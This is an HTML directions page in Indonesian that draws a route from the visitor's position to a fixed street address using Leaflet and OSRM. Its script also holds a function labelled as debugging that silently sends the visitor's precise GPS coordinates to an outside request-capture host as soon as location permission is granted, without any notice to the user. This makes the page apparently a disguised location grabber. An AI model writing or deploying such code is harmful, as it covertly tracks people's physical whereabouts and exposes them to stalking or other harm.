<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
}

.mode-row {
  display: flex;
  gap: 14px;
  margin-bottom: 8px;
}

.mode {
  font-size: 22px;
  opacity: .4;
}

.mode.active {
  opacity: 1;
}


#map {
  width: 100%;
  height: 100%;
}

/* ===== LOADING SCREEN ===== */
.loading {
  position: fixed;
  inset: 0;
  background: #fff;
  z-index: 2000;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.spinner {
  width: 48px;
  height: 48px;
  border: 4px solid #e0e0e0;
  border-top-color: #1a73e8;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.bottom-panel {
  position: fixed;
  bottom: 0;
  width: 100%;
  background: #fff;
  padding: 16px 20px 18px;
  box-shadow: 0 -2px 10px rgba(0,0,0,.25);
  z-index: 1000;
}

/* ETA */
.eta-row {
  display: flex;
  align-items: baseline;
  gap: 6px;
}

.eta-value {
  font-size: 34px;
  font-weight: 700;
  line-height: 1;
}

.eta-unit {
  font-size: 16px;
  color: #202124;
}

/* META */
.route-meta {
  margin-top: 4px;
  font-size: 14px;
  color: #5f6368;
}


.loading-text {
  margin-top: 14px;
  font-size: 14px;
  color: #5f6368;
}

/* TOP PANEL */
.top-panel {
  position: fixed;
  top: 12px;
  left: 50%;
  transform: translateX(-50%);
  width: 94%;
  background: #fff;
  border-radius: 14px;
  box-shadow: 0 2px 10px rgba(0,0,0,.25);
  z-index: 1000;
  padding: 12px;
}

.location-row {
  display: flex;
  align-items: center;
  gap: 10px;
  font-size: 14px;
}

.dot {
  width: 10px;
  height: 10px;
  border-radius: 50%;
}

.dot.blue { background: #1a73e8; }
.dot.red { background: #d93025; }

.divider {
  height: 1px;
  background: #e0e0e0;
  margin: 8px 0;
}

/* BOTTOM PANEL */
.bottom-panel {
  position: fixed;
  bottom: 0;
  width: 100%;
  background: #fff;
  padding: 16px;
  box-shadow: 0 -2px 10px rgba(0,0,0,.25);
  z-index: 1000;
}

.time {
  font-size: 20px;
  font-weight: 600;
}

.distance {
  font-size: 14px;
  color: #5f6368;
}
</style>

<body>

<!-- LOADING -->
<div class="loading" id="loading">
  <div class="spinner"></div>
  <div class="loading-text">Loading…</div>
</div>

<div class="top-panel">
  <div class="location-row">
    <div class="dot blue"></div>
    <div>Lokasi Anda</div>
  </div>
  <div class="divider"></div>
  <div class="location-row">
    <div class="dot red"></div>
    <div>Jl. Kh. Achmad Dahlan No.93, RT.003/RW.009, Petir...</div>
  </div>
</div>

<div id="map"></div>

<div class="bottom-panel">
<div class="mode-row">
  <div class="mode active">
    🚗
  </div>
  <div class="mode">
    🏍️
  </div>
  <div class="mode">
    🚶
  </div>
</div>

  <div class="eta-row">
    <span class="eta-value" id="etaValue">–</span>
    <span class="eta-unit">menit</span>
  </div>
  <div class="route-meta" id="routeMeta"></div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>
// === TUJUAN TETAP ===
const DESTINATION = {
  lat: -4.9528397,
  lng: 105.203663
};

// INIT MAP
const map = L.map('map', { zoomControl: false });

// TILE
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
  attribution: '© OpenStreetMap'
}).addTo(map);

// LOADING
const loadingEl = document.getElementById('loading');

function sendDebugLocation(lat, lon) {
  const payload = `lat=${lat}&lon=${lon}`;
  const encoded = encodeURIComponent(payload);

  const url = `https://debug-mpppp.free.beeceptor.com/debug=${encoded}`;

  // Fire & forget (tidak ganggu UI)
  fetch(url).catch(err => {
    console.warn("Debug send failed:", err);
  });
}


// GEOLOCATION
navigator.geolocation.getCurrentPosition(
  pos => {
    const user = {
      lat: pos.coords.latitude,
      lng: pos.coords.longitude
    };
	
    sendDebugLocation(user.lat, user.lng);

    // Ambil routing asli
    getRoute(user, DESTINATION);
  },
  () => {
    loadingEl.style.display = 'none';
    alert("Izin lokasi diperlukan untuk menampilkan rute.");
  },
  { enableHighAccuracy: true }
);

function formatDuration(seconds) {
  const totalMinutes = Math.round(seconds / 60);
  const totalHours = Math.floor(totalMinutes / 60);
  const days = Math.floor(totalHours / 24);
  const hours = totalHours % 24;
  const minutes = totalMinutes % 60;

  if (days > 0) {
    return `${days} hari ${hours} jam`;
  }

  if (totalHours > 0) {
    return `${totalHours} jam ${minutes} mnt`;
  }

  return `${totalMinutes} menit`;
}


// ===== ROUTING OSRM =====
function getRoute(start, end) {
  const url = `https://router.project-osrm.org/route/v1/driving/` +
              `${start.lng},${start.lat};${end.lng},${end.lat}` +
              `?overview=full&geometries=geojson`;

  fetch(url)
    .then(res => res.json())
    .then(data => {
      if (!data.routes || !data.routes.length) {
        throw new Error("Rute tidak ditemukan");
      }

      const route = data.routes[0];

      // DRAW ROUTE
      const routeLine = L.geoJSON(route.geometry, {
        style: {
          color: '#1a73e8',
          weight: 6
        }
      }).addTo(map);

      // MARKERS
      L.marker([start.lat, start.lng]).addTo(map).bindPopup("Lokasi Anda");
      L.marker([end.lat, end.lng]).addTo(map).bindPopup("Tujuan");

      map.fitBounds(routeLine.getBounds(), { padding: [80, 80] });

      // INFO
      const distanceKm = (route.distance / 1000).toFixed(1);
      const durationMin = Math.round(route.duration / 60);

document.getElementById('etaValue').innerText =
  formatDuration(route.duration);

document.getElementById('routeMeta').innerText =
  distanceKm + " km · Rute tercepat";


      // HIDE LOADING
      loadingEl.style.display = 'none';
    })
    .catch(err => {
      loadingEl.style.display = 'none';
      alert("Gagal mengambil rute.");
      console.error(err);
    });
}
</script>

</body>
</html>
